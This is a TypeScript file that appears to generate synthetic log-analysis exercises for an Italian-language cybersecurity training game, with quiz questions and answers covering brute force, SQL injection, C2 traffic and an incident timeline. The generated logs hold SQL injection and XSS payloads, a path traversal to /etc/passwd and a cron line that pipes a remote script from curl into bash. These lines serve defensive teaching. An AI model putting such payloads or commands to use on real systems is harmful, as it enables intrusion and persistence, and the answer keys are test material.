export interface LogScenario {
  d: number;
  filename: string;
  kind: 'auth' | 'web' | 'firewall' | 'app';
  build: (seed: number) => { lines: string[]; questions: { q: string; answer: string; accept?: string[] }[] };
  brief: string;
  learn: string;
  glossary: string[];
}

import { RNG } from '../rng';

const USERS = ['admin', 'root', 'mrossi', 'gverdi', 'support', 'backup', 'jenkins', 'dbuser', 'webadmin'];
const PATHS = ['/login', '/admin', '/api/users', '/index.php', '/wp-login.php', '/dashboard', '/api/orders', '/checkout'];
const AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0)',
  'Mozilla/5.0 (X11; Linux x86_64)',
  'curl/7.88.1',
  'python-requests/2.31',
  'sqlmap/1.7',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)',
];

function randIp(r: RNG): string {
  return `${r.int(1, 223)}.${r.int(0, 255)}.${r.int(0, 255)}.${r.int(1, 254)}`;
}
function pad(n: number): string {
  return String(n).padStart(2, '0');
}
function ts(r: RNG, baseH: number, minOffset: number): string {
  const m = (minOffset) % 60;
  const h = (baseH + Math.floor(minOffset / 60)) % 24;
  return `${pad(h)}:${pad(m)}:${pad(r.int(0, 59))}`;
}

export const LOG_SCENARIOS: LogScenario[] = [
  {
    d: 1,
    filename: 'access.log',
    kind: 'web',
    brief: 'Qualcuno ha fatto ordini falsi sul sito della pizzeria. Ogni riga è un accesso: IP, ora e pagina.',
    learn: 'Un log web registra ogni richiesta. Cercare pattern ripetuti dallo stesso IP è il primo passo di ogni indagine.',
    glossary: ['logs', 'ip'],
    build: (seed) => {
      const r = new RNG(seed);
      const attacker = randIp(r);
      const normals = [randIp(r), randIp(r), randIp(r)];
      const lines: string[] = [];
      const events: { ip: string; path: string; t: number }[] = [];
      for (let i = 0; i < 6; i++) events.push({ ip: r.pick(normals), path: r.pick(['/index.php', '/menu', '/checkout']), t: r.int(0, 50) });
      const n = r.int(5, 7);
      for (let i = 0; i < n; i++) events.push({ ip: attacker, path: '/api/orders', t: 20 + i });
      r.shuffle(events).forEach((e) => {
        lines.push(`[12:${pad(e.t % 60)}:${pad(r.int(0, 59))}] ${e.ip} "POST ${e.path}" 200`);
      });
      return {
        lines,
        questions: [
          { q: 'Qual è l\'indirizzo IP che ha fatto ripetuti ordini (POST /api/orders)?', answer: attacker },
          { q: `Quante richieste a /api/orders ha fatto quell'IP?`, answer: String(n) },
        ],
      };
    },
  },
  {
    d: 2,
    filename: 'auth.log',
    kind: 'auth',
    brief: 'Il registro elettronico va giù. Questi sono i log di autenticazione SSH del server. Trova chi tenta di entrare.',
    learn: 'Molti "Failed password" dallo stesso IP in pochi secondi = attacco brute force. Un "Accepted password" dopo tanti fallimenti è il momento della compromissione.',
    glossary: ['logs', 'bruteforce', 'ssh'],
    build: (seed) => {
      const r = new RNG(seed);
      const attacker = randIp(r);
      const target = r.pick(USERS);
      const lines: string[] = [];
      const fails = r.int(8, 14);
      for (let i = 0; i < fails; i++) {
        lines.push(`Nov 18 03:${pad(12 + Math.floor(i / 3))}:${pad(r.int(0, 59))} srv sshd[${r.int(1000, 9999)}]: Failed password for ${r.chance(0.5) ? target : r.pick(USERS)} from ${attacker} port ${r.int(40000, 60000)} ssh2`);
      }
      const okMin = 12 + Math.floor(fails / 3) + 1;
      lines.push(`Nov 18 03:${pad(okMin)}:${pad(r.int(0, 59))} srv sshd[${r.int(1000, 9999)}]: Accepted password for ${target} from ${attacker} port ${r.int(40000, 60000)} ssh2`);
      // qualche riga legittima
      lines.unshift(`Nov 18 09:15:22 srv sshd[2201]: Accepted publickey for ${r.pick(USERS)} from ${randIp(r)} port 51234 ssh2`);
      return {
        lines,
        questions: [
          { q: 'Qual è l\'IP che sta facendo brute force?', answer: attacker },
          { q: 'Quale utente è stato compromesso (Accepted password dopo i tentativi falliti)?', answer: target },
          { q: 'A che ora (HH:MM) è avvenuto l\'accesso riuscito?', answer: `03:${pad(okMin)}` , accept: [`3:${pad(okMin)}`]},
        ],
      };
    },
  },
  {
    d: 3,
    filename: 'access.log',
    kind: 'web',
    brief: 'Server web di ShopFast. Cerca la firma di un attacco alle applicazioni web nei parametri delle richieste.',
    learn: "Caratteri come ' OR 1=1, <script>, ../ nei parametri URL sono firme di SQL injection, XSS e path traversal. Lo user-agent sqlmap conferma un tool automatico.",
    glossary: ['logs', 'sqli', 'useragent'],
    build: (seed) => {
      const r = new RNG(seed);
      const attacker = randIp(r);
      const lines: string[] = [];
      for (let i = 0; i < 5; i++) {
        lines.push(`${randIp(r)} - [10:${pad(r.int(0, 59))}:00] "GET ${r.pick(PATHS)} HTTP/1.1" 200 "${r.pick(AGENTS.slice(0, 2))}"`);
      }
      lines.push(`${attacker} - [10:22:01] "GET /api/users?id=1' OR '1'='1 HTTP/1.1" 500 "sqlmap/1.7"`);
      lines.push(`${attacker} - [10:22:03] "GET /api/users?id=1 UNION SELECT password FROM users-- HTTP/1.1" 200 "sqlmap/1.7"`);
      lines.push(`${randIp(r)} - [10:23:10] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 "${r.pick(AGENTS)}"`);
      return {
        lines: r.shuffle(lines),
        questions: [
          { q: 'Quale IP ha usato il tool automatico sqlmap per la SQL injection?', answer: attacker },
          { q: 'Che tipo di attacco contiene il parametro "UNION SELECT password"? (una parola)', answer: 'sqli', accept: ['sql injection', 'sql', 'injection', 'sqli'] },
          { q: 'Il parametro con <script>alert(1)</script> è un tentativo di quale attacco? (sigla)', answer: 'xss' },
        ],
      };
    },
  },
  {
    d: 4,
    filename: 'firewall.log',
    kind: 'firewall',
    brief: 'Log del firewall di NimbusCloud. Un host interno comunica con un server sconosciuto su una porta insolita: possibile esfiltrazione dati.',
    learn: "Traffico in USCITA (outbound) verso IP sconosciuti su porte alte e ripetuto può indicare un canale di comando-e-controllo (C2) o esfiltrazione dati.",
    glossary: ['logs', 'c2', 'firewall'],
    build: (seed) => {
      const r = new RNG(seed);
      const internal = `10.0.${r.int(1, 10)}.${r.int(10, 99)}`;
      const c2 = randIp(r);
      const port = r.pick([4444, 8443, 9001, 1337, 31337]);
      const lines: string[] = [];
      for (let i = 0; i < 4; i++) {
        lines.push(`ALLOW ${internal} -> ${randIp(r)}:443 TCP (HTTPS)`);
      }
      const reps = r.int(5, 8);
      for (let i = 0; i < reps; i++) {
        lines.push(`ALLOW ${internal} -> ${c2}:${port} TCP (${r.int(1200, 9000)} bytes)`);
      }
      lines.push(`DENY ${randIp(r)} -> ${internal}:22 TCP (blocked)`);
      return {
        lines: r.shuffle(lines),
        questions: [
          { q: 'Verso quale IP esterno l\'host interno invia traffico ripetuto (sospetto C2)?', answer: c2 },
          { q: 'Su quale porta avviene questa comunicazione sospetta?', answer: String(port) },
          { q: 'Qual è l\'IP dell\'host interno compromesso?', answer: internal },
        ],
      };
    },
  },
  {
    d: 5,
    filename: 'incident.log',
    kind: 'app',
    brief: 'Centrale idrica: timeline di un incidente. Ricostruisci la sequenza dell\'attacco dai log applicativi correlati.',
    learn: 'La "kill chain": ricognizione → accesso iniziale → escalation → azione. Correlare eventi da fonti diverse per tempo è il cuore dell\'incident response.',
    glossary: ['logs', 'killchain', 'forensics'],
    build: (seed) => {
      const r = new RNG(seed);
      const attacker = randIp(r);
      const user = r.pick(USERS);
      const lines = [
        `02:10:04 [web] ${attacker} GET /scada/?file=../../../../etc/passwd -> 200`,
        `02:11:30 [auth] Failed password for ${user} from ${attacker} (x12)`,
        `02:14:02 [auth] Accepted password for ${user} from ${attacker}`,
        `02:15:45 [sys] ${user} executed: sudo -i  (privilege escalation)`,
        `02:17:20 [sys] new cron job added: * * * * * curl ${randIp(r)}/x.sh | bash`,
        `02:19:00 [scada] setpoint pressione modificato: 4.2 -> 9.8 bar`,
      ];
      return {
        lines,
        questions: [
          { q: 'Qual è l\'IP dell\'attaccante?', answer: attacker },
          { q: 'Quale utente è stato compromesso?', answer: user },
          { q: 'Con quale attacco ha ottenuto i privilegi di root? (il comando, una parola)', answer: 'sudo' },
          { q: 'Che meccanismo di persistenza ha installato? (due parole)', answer: 'cron job', accept: ['cron', 'cronjob', 'crontab'] },
        ],
      };
    },
  },
];
